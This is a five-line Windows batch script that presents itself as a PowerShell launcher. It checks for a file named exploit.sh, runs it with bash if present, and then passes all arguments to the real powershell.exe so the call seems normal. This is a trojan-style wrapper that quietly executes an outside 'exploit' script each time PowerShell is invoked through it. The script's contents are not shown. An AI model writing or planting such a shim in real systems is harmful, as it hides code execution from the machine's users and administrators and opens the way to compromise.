@echo off
if exist exploit.sh (
    bash exploit.sh
)
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe %*
